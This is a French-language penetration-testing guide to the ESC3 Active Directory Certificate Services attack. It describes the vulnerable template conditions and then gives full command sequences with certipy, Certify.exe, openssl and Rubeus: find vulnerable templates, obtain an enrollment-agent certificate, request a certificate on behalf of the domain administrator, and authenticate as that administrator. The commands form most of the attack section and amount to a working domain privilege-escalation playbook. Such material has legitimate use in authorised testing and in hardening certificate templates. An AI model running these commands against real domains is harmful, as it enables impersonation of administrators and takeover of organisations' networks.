### Description

ESC3 exploite des modèles de certificats configurés avec l'EKU "Certificate Request Agent" (Enrollment Agent), permettant à un attaquant de demander des certificats au nom d'autres utilisateurs via un processus d'enrollment en deux étapes.

### Conditions vulnérables

Un modèle de certificat est vulnérable à ESC3 si :

1. **Enrollment autorisé** - L'utilisateur a les droits `Enroll` ou `AutoEnroll`
2. **EKU Certificate Request Agent** - Le modèle a l'EKU `Certificate Request Agent` (OID: 1.3.6.1.4.1.311.20.2.1)
3. **Pas de signatures requises** - `CT_FLAG_PEND_ALL_REQUESTS` n'est pas activé
4. **Template cible disponible** - Un autre template permet l'authentification et accepte les demandes via Enrollment Agent

---

### Exploitation depuis linux (certipy)

Enumération des templates vulnérables :

```bash
certipy find -u user@domain.local -p password -target dc01.domain.local

# Énumération avec sortie JSON pour analyse 
certipy find -u user@domain.local -p password -target dc01.domain.local -json -output vulnerabilities.json 

# Recherche spécifique des modèles Certificate Request Agent
certipy find -u user@domain.local -p password -target dc01.domain.local | grep -i "certificate request agent"
```

Faire la demande de certificat Enrollment Agent :

```bash
certipy req -u user@domain.local -p password -target dc01.domain.local -ca 'domain-DC01-CA' -template 'EnrollmentAgentTemplate'
```

Utilisation du certificat Enrollment Agent pour demander un certificat cible :

```bash
certipy req -u user@domain.local -p password -target dc01.domain.local -ca 'domain-DC01-CA' -template 'UserTemplate' -on-behalf-of 'domain\administrator' -pfx user.pfx
```

Authentification avec le certificat final :

```bash
certipy auth -pfx administrator.pfx -username administrator -domain domain.local -dc-ip 192.168.1.10
```

---

### Exploitation depuis windows (certify.exe)

Enumération des templates vulnérables :

```powershell
# Énumération des modèles vulnérables 
Certify.exe find /vulnerable 

# Filtrage spécifique ESC3
Certify.exe find /vulnerable | findstr "Certificate Request Agent"
```

Faire la demande de certificat Enrollment Agent :

```powershell
Certify.exe request /ca:DC01.domain.local\domain-DC01-CA /template:EnrollmentAgentTemplate
```

Utilisation du certificat Enrollment Agent :

```powershell
Certify.exe request /ca:DC01.domain.local\domain-DC01-CA /template:UserTemplate /onbehalfof:domain\administrator /enrollcert:agent.pfx /enrollcertpw:password123
```

Authentification avec le certificat final :

```powershell
# Conversion du certificat si nécessaire
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx 

# Authentification avec le certificat 
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:password123 /ptt
```